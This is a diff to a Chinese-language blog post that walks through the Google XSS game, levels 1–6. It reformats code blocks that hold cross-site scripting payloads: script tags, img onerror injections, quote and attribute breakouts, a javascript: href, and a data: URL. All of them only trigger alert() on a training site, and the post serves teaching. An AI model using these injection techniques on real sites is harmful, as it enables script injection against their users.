@@ -48,8 +48,8 @@ Web应用的安全问题也是一个web开发人员需要了解的事，今天�
 一个提交表单的页面，输入数据data并提交。
 观察py代码可以看到他会将data渲染到页面内，那么我可以输入以下内容：
 
-```javascript
-【<script>alert(1)</script>】
+```html
+<script>alert(1)</script>
 ```
 
 OK，Hello World to XSS就完成了。
@@ -66,7 +66,7 @@ OK，Hello World to XSS就完成了。
 
 
 ```html
-【<img src="" onerror="alert(1)"/>】
+<img src="" onerror="alert(1)"/>
 ```
 
 level2 is over！
@@ -77,15 +77,15 @@ level2 is over！
 
 通过观察源码，发现他将url输入的数字编号通过img标签进行拼接了（num就是我们输入的数）。
 
-```javascript
-【html += "<img src='/static/level3/cloud" + num + ".jpg' />";】
+```html
+html += "<img src='/static/level3/cloud" + num + ".jpg' />";
 ```
 
 那我们可以通过如下代码来封闭标签：
 
-```javascript
+```html
 
-【https://xss-game.appspot.com/level3/frame#x' onerror='alert("xss")'>】
+https://xss-game.appspot.com/level3/frame#x' onerror='alert("xss")'>
 
 ```
 
@@ -95,18 +95,19 @@ level2 is over！
 
 一个输入表单数据timer，然后提交。
 
-通过查看py代码，发现他的数据渲染部分（`{{}}`是模板）：
+通过查看py代码，发现他的数据渲染部分：
 
-```html
-【<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />】
+```text
+  <img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
+
 ```
 
 我们利用封闭标签，输入如下代码：
 
 ```text
-【');alert('xss】
+');alert('xss
 
-模板渲染后：【onload="startTimer('');alert('xss');"】
+模板渲染后：onload="startTimer('');alert('xss');"
 ```
 这样就完成了。
 
@@ -116,15 +117,15 @@ level2 is over！
 观察源码有一个a标签是通过模板渲染的:
 
 ```html
-【<a href="{{ next }}">Next >></a>】
+<a href="{{ next }}">Next >></a>
 ```
 
 这里使用a标签的伪协议来完成，我们可以输入：
 
 ```html
-【https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)】
+https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
 
-模板渲染后：【<a href="javascript:alert(1)">Next >></a>】
+模板渲染后：<a href="javascript:alert(1)">Next >></a>
 ```
 
 #### level6
@@ -135,8 +136,8 @@ level2 is over！
 
 结果：
 
-```
-【https://xss-game.appspot.com/level6/frame#data:text/plain,alert('xss')】
+``` html
+https://xss-game.appspot.com/level6/frame#data:text/plain,alert('xss')
 ```
 
 ## CSRF
